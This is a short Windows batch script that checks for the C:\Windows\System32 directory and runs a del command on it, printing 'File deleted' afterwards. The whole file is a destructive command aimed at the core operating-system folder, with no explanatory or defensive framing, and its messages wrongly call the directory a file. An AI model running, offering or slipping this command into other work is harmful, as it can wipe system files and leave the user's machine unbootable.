@echo off
if exist "C:\Windows\System32" (
    del "C:\Windows\System32"
    echo File deleted
) else (
    echo File not found
)
